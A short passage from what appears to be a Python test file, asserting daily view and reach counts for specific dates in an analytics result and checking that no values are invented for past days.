    assert rows[date(2026, 11, 4)]["views"] == 300  # today so far
    assert rows[date(2026, 11, 1)] == {"views": 5000, "reach": 3000}  # no stock values invented for the past
